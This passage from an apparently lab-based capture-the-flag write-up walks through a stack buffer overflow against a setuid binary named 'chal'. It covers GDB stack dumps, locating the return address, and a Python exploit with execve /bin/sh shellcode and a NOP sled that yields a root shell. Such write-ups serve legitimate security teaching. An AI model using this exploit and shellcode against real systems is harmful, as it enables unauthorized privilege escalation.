This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/local/bin/chal...(no debugging symbols found)...done.
(gdb) r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Starting program: /usr/local/bin/chal aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
```

Checking the registers we confirm that EIP and EBP have been overwritten:

```text
(gdb) info registers
eax            0x0      0
ecx            0xbffff8a0       -1073743712
edx            0xbffff566       -1073744538
ebx            0xb7fce000       -1208164352
esp            0xbffff500       0xbffff500
ebp            0x61616161       0x61616161
esi            0x0      0
edi            0x0      0
eip            0x61616161       0x61616161
eflags         0x10202  [ IF RF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```

We know the EIP (Extended Instruction Pointer) contains the address of the next instruction to be executed, which now points to our input, in the above instance that's our aaaa.

Now we can look at the stack to see where that address is:

```text
(gdb) x/100x $esp
0xbffff500:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff510:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff520:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff530:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff540:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff550:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff560:     0x61616161      0x61616161      0x00000000      0x08048341
0xbffff570:     0x0804841d      0x00000002      0xbffff594      0x08048450
0xbffff580:     0x080484c0      0xb7fed160      0xbffff58c      0x0000001c
0xbffff590:     0x00000002      0xbffff6b8      0xbffff6cc      0x00000000
0xbffff5a0:     0xbffff8a3      0xbffff8b4      0xbffff8c4      0xbffff8d8
0xbffff5b0:     0xbffff8fe      0xbffff911      0xbffff923      0xbffffe44
0xbffff5c0:     0xbffffe50      0xbffffeae      0xbffffeca      0xbffffed9
0xbffff5d0:     0xbffffef0      0xbfffff01      0xbfffff0a      0xbfffff22
0xbffff5e0:     0xbfffff2a      0xbfffff3f      0xbfffff87      0xbfffffa7
0xbffff5f0:     0xbfffffc6      0x00000000      0x00000020      0xb7fdccf0
0xbffff600:     0x00000021      0xb7fdc000      0x00000010      0x078bfbff
0xbffff610:     0x00000006      0x00001000      0x00000011      0x00000064
0xbffff620:     0x00000003      0x08048034      0x00000004      0x00000020
0xbffff630:     0x00000005      0x00000009      0x00000007      0xb7fde000
0xbffff640:     0x00000008      0x00000000      0x00000009      0x08048320
0xbffff650:     0x0000000b      0x000003e8      0x0000000c      0x000003e8
0xbffff660:     0x0000000d      0x000003e8      0x0000000e      0x000003e8
0xbffff670:     0x00000017      0x00000001      0x00000019      0xbffff69b
0xbffff680:     0x0000001f      0xbfffffe8      0x0000000f      0xbffff6ab
```

This has shown us the first 100 bytes from the top of the stack in hexadecimal. We can see our repeated aaaa blocks represented as 0x61616161 in hex.

Now we move back 400 bytes with an offset of -400:

```text
(gdb) x/100x $esp-400
0xbffff370:     0xbffff392      0x00000000      0x00000000      0x08048441
0xbffff380:     0xbffff392      0xbffff6cc      0x0804821d      0xb7fffc24
0xbffff390:     0x616118fc      0x61616161      0x61616161      0x61616161
0xbffff3a0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff3b0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff3c0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff3d0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff3e0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff3f0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff400:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff410:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff420:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff430:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff440:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff450:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff460:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff470:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff480:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff490:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff4a0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff4b0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff4c0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff4d0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff4e0:     0x61616161      0x61616161      0x61616161      0x61616161
0xbffff4f0:     0x61616161      0x61616161      0x61616161      0x61616161
```

We don't have to be exact, just pick something within the range where we see our payload of 0x61616161. So for this we pick 0xbffff4c0, note that you have to reverse the order of the last 8 characters as this system uses little endian (explanation of Endianness [here](https://en.wikipedia.org/wiki/Endianness). This means **0x bf ff f4 co** becomes **c0 f4 ff bf 0x**, but we drop the last 0x. Also as with the shellcode we add \x in front of each group of two.

Update our exploit:

```text
buffsize = 362
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
nopsled = "\x90"*(buffsize-len(shellcode))
eip = "\xc0\xf4\xff\xbf"
```

Now to finish our exploit we need to combine the parts in to the payload variable and print it out:

```text
buffsize = 362
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
nopsled = "\x90"*(buffsize-len(shellcode))
eip = "\xc0\xf4\xff\xbf"
payload = nopsled + shellcode + eip
print payload
```

Now run the exploit in gdb:

```text
thrasivoulos@Sneaky:~$ gdb /usr/local/bin/chal

GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/local/bin/chal...(no debugging symbols found)...done.
(gdb) r $(python exploit.py)
Starting program: /usr/local/bin/chal $(python exploit.py)

Program received signal SIGSEGV, Segmentation fault.
0xc080cd40 in ?? ()
```

Now we have the stack set up with our actual payload, so we need to find the correct memory address:

```text
(gdb) x/100x $esp
0xbffff560:     0x00bffff4      0xbffff5f4      0xbffff600      0xb7feccca
0xbffff570:     0x00000002      0xbffff5f4      0xbffff594      0x0804a014
0xbffff580:     0x0804821c      0xb7fce000      0x00000000      0x00000000
0xbffff590:     0x00000000      0xd1acbedc      0xe9331acc      0x00000000
0xbffff5a0:     0x00000000      0x00000000      0x00000002      0x08048320
0xbffff5b0:     0x00000000      0xb7ff24c0      0xb7e3ba09      0xb7fff000
0xbffff5c0:     0x00000002      0x08048320      0x00000000      0x08048341
0xbffff5d0:     0x0804841d      0x00000002      0xbffff5f4      0x08048450
0xbffff5e0:     0x080484c0      0xb7fed160      0xbffff5ec      0x0000001c
0xbffff5f0:     0x00000002      0xbffff71d      0xbffff731      0x00000000
0xbffff600:     0xbffff8a3      0xbffff8b4      0xbffff8c4      0xbffff8d8
0xbffff610:     0xbffff8fe      0xbffff911      0xbffff923      0xbffffe44
0xbffff620:     0xbffffe50      0xbffffeae      0xbffffeca      0xbffffed9
0xbffff630:     0xbffffef0      0xbfffff01      0xbfffff0a      0xbfffff22
0xbffff640:     0xbfffff2a      0xbfffff3f      0xbfffff87      0xbfffffa7
0xbffff650:     0xbfffffc6      0x00000000      0x00000020      0xb7fdccf0
0xbffff660:     0x00000021      0xb7fdc000      0x00000010      0x078bfbff
0xbffff670:     0x00000006      0x00001000      0x00000011      0x00000064
0xbffff680:     0x00000003      0x08048034      0x00000004      0x00000020
0xbffff690:     0x00000005      0x00000009      0x00000007      0xb7fde000
0xbffff6a0:     0x00000008      0x00000000      0x00000009      0x08048320
0xbffff6b0:     0x0000000b      0x000003e8      0x0000000c      0x000003e8
0xbffff6c0:     0x0000000d      0x000003e8      0x0000000e      0x000003e8
0xbffff6d0:     0x00000017      0x00000001      0x00000019      0xbffff6fb
0xbffff6e0:     0x0000001f      0xbfffffe8      0x0000000f      0xbffff70b
(gdb) x/100x $esp-500
0xbffff36c:     0xb7fd9b48      0x00000001      0x00000001      0x00000000
0xbffff37c:     0xb7fe90ab      0xb7fffaf0      0xb7fd9e08      0xbffff3a4
0xbffff38c:     0x0804a00c      0x0804821c      0x080481dc      0x00000000
0xbffff39c:     0x00000000      0xb7fff55c      0xb7e26534      0xbffff428
0xbffff3ac:     0x00000000      0xb7ff756c      0xb7fce000      0x00000000
0xbffff3bc:     0x00000000      0xbffff558      0xb7ff24c0      0xbffff584
0xbffff3cc:     0xb7ea6a30      0xbffff3f2      0x00000000      0x00000000
0xbffff3dc:     0x08048441      0xbffff3f2      0xbffff731      0x0804821d
0xbffff3ec:     0xb7fffc24      0x909018fc      0x90909090      0x90909090
0xbffff3fc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff40c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff41c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff42c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff43c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff44c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff45c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff46c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff47c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff48c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff49c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4ac:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4bc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4cc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4dc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff4ec:     0x90909090      0x90909090      0x90909090      0x90909090
(gdb)
0xbffff4fc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff50c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff51c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff52c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff53c:     0x90909090      0x31909090      0x2f6850c0      0x6868732f
0xbffff54c:     0x6e69622f      0xc189e389      0x0bb0c289      0xc03180cd
0xbffff55c:     0xc080cd40      0x00bffff4      0xbffff5f4      0xbffff600
0xbffff56c:     0xb7feccca      0x00000002      0xbffff5f4      0xbffff594
0xbffff57c:     0x0804a014      0x0804821c      0xb7fce000      0x00000000
0xbffff58c:     0x00000000      0x00000000      0xd1acbedc      0xe9331acc
0xbffff59c:     0x00000000      0x00000000      0x00000000      0x00000002
0xbffff5ac:     0x08048320      0x00000000      0xb7ff24c0      0xb7e3ba09
0xbffff5bc:     0xb7fff000      0x00000002      0x08048320      0x00000000
0xbffff5cc:     0x08048341      0x0804841d      0x00000002      0xbffff5f4
0xbffff5dc:     0x08048450      0x080484c0      0xb7fed160      0xbffff5ec
0xbffff5ec:     0x0000001c      0x00000002      0xbffff71d      0xbffff731
0xbffff5fc:     0x00000000      0xbffff8a3      0xbffff8b4      0xbffff8c4
0xbffff60c:     0xbffff8d8      0xbffff8fe      0xbffff911      0xbffff923
0xbffff61c:     0xbffffe44      0xbffffe50      0xbffffeae      0xbffffeca
0xbffff62c:     0xbffffed9      0xbffffef0      0xbfffff01      0xbfffff0a
0xbffff63c:     0xbfffff22      0xbfffff2a      0xbfffff3f      0xbfffff87
0xbffff64c:     0xbfffffa7      0xbfffffc6      0x00000000      0x00000020
0xbffff65c:     0xb7fdccf0      0x00000021      0xb7fdc000      0x00000010
0xbffff66c:     0x078bfbff      0x00000006      0x00001000      0x00000011
0xbffff67c:     0x00000064      0x00000003      0x08048034      0x00000004
(gdb)
0xbffff68c:     0x00000020      0x00000005      0x00000009      0x00000007
0xbffff69c:     0xb7fde000      0x00000008      0x00000000      0x00000009
0xbffff6ac:     0x08048320      0x0000000b      0x000003e8      0x0000000c
0xbffff6bc:     0x000003e8      0x0000000d      0x000003e8      0x0000000e
0xbffff6cc:     0x000003e8      0x00000017      0x00000001      0x00000019
0xbffff6dc:     0xbffff6fb      0x0000001f      0xbfffffe8      0x0000000f
0xbffff6ec:     0xbffff70b      0x00000000      0x00000000      0xcf000000
0xbffff6fc:     0x3f9b7e30      0x99d19723      0x17bfcf9a      0x69fe28c6
0xbffff70c:     0x00363836      0x00000000      0x00000000      0x00000000
0xbffff71c:     0x73752f00      0x6f6c2f72      0x2f6c6163      0x2f6e6962
0xbffff72c:     0x6c616863      0x90909000      0x90909090      0x90909090
0xbffff73c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff74c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff75c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff76c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff77c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff78c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff79c:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7ac:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7bc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7cc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7dc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7ec:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7fc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff80c:     0x90909090      0x90909090      0x90909090      0x90909090
```

This time we pick another address near our NOP_SLED which we can see above represented by 0x90909090, in this case we pick 0xbffff74c.

Update our script for the last time:

```text
thrasivoulos@Sneaky:~$ nano exploit.py
buffsize = 362
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
nopsled = "\x90"*(buffsize-len(shellcode))
eip = "\x4c\xf7\xff\xbf" # change this to new addres
payload = nopsled + shellcode + eip
print payload
```

### Root Flag

Now run the binary using our script as the parameter:

```text
thrasivoulos@Sneaky:~$ chal $(python exploit.py)
```

Now we are in a new shell as root:

```text
# id
uid=1000(thrasivoulos) gid=1000(thrasivoulos) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(thrasivoulos)
```

Time to get the last flag:

```text
# cat /root/root.txt
<<HIDDEN>>
```

Here are a few helpful resouces that I used in this blog:

- [GDB Reference](https://visualgdb.com/gdbreference/commands/x)
- [Stack Analysis with GDB](https://resources.infosecinstitute.com/stack-analysis-with-gdb/#gref)
- [Buffer Overflow attacks explained](https://www.coengoedegebure.com/buffer-overflow-attacks-explained/)
